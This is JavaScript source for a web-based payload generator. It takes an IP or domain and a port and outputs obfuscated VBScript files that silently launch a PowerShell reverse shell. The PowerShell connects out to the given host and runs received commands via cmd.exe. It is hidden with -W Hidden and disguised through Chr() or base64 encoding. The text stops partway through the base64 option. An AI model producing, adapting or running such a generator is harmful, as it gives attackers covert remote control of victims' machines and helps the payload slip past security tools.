document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modal-title');
    const modalMessage = document.getElementById('modal-message');
    const modalClose = document.querySelector('.modal-close');
    const modalOk = document.getElementById('modal-ok');
    
    let currentVbsContent = '';
    
    function showModal(title, message, isError = false) {
        modalTitle.textContent = title;
        modalMessage.textContent = message;
        modal.style.display = 'flex';
        
        if (isError) {
            modalTitle.style.color = 'var(--danger)';
        } else {
            modalTitle.style.color = 'var(--secondary)';
        }
    }
    
    modalClose.addEventListener('click', () => {
        modal.style.display = 'none';
    });
    
    modalOk.addEventListener('click', () => {
        modal.style.display = 'none';
    });
    
    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.style.display = 'none';
        }
    });

    function validateIpOrDomain(value) {
        const ipPattern = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        const domainPattern = /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$/;
        const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}$/;
        return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
    }
    
    function validatePort(port) {
        return port > 0 && port <= 65535;
    }
    
    function powershellReverseShell(ip, port) {
        return (
            `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
            "$stream = $client.GetStream();" +
            "$writer = New-Object System.IO.StreamWriter($stream);" +
            "$buffer = New-Object System.Byte[] 1024;" +
            "$encoding = New-Object System.Text.ASCIIEncoding;" +
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){" +
            "$command = $encoding.GetString($buffer, 0, $read);" +
            "$output = cmd.exe /c $command 2>&1 | Out-String;" +
            "$writer.WriteLine($output);" +
            "$writer.Flush()" +
            "}"
        );
    }
    
    function obfuscateChr(text) {
        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
    }
    
    function downloadFile(content, filename) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename.endsWith('.vbs') ? filename : `${filename}.vbs`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
    
    document.getElementById('generate-chr').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        
        if (!ip) {
            showModal('Error', 'Please enter target IP/Domain', true);
            return;
        }
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain format', true);
            return;
        }
        
        if (!port || !validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        try {
            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
            const payload = powershellReverseShell(ip, port);
            const obfPayload = obfuscateChr(payload);
            currentVbsContent = (
                'Set x = CreateObject("WScript.Shell")\n' +
                `x.Run ${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
            );
            
            document.getElementById('vbs-output').value = currentVbsContent;
            showModal('Success', 'CHR method VBS payload generated!');
        } catch (e) {
            showModal('Error', `Generation failed: ${e.message}`, true);
        }
    });
    
    document.getElementById('generate-b64').addEventListener('click', () => {
        const ip = document.getElementById('ip').value;
        const port = parseInt(document.getElementById('port').value);
        
        if (!ip) {
            showModal('Error', 'Please enter target IP/Domain', true);
            return;
        }
        
        if (!validateIpOrDomain(ip)) {
            showModal('Error', 'Invalid IP/Domain format', true);
            return;
        }
        
        if (!port || !validatePort(port)) {
            showModal('Error', 'Port must be between 1 and 65535', true);
            return;
        }
        
        try {
            const payload = powershellReverseShell(ip, port);
            const encoder = new TextEncoder();
            const encoded = btoa(String.fromCharCode(...encoder.encode(payload)));
            currentVbsContent = (
                'Set shell = CreateObject("Wscript.Shell")\n' +
                `shell.Run "powers
